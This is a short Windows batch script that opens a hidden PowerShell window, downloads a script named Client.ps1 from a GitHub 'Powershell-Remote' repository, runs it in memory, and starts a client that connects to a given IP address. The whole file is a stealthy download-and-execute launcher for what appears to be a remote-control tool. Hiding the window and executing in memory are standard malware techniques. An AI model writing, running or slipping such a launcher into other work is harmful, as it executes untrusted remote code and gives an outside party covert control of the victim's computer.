@echo off

powershell -windowstyle hidden -c "iex(wget "https://raw.github.com/mo-tec/Powershell-Remote/main/Client.ps1");Start-Client -ip 192.168.178.21"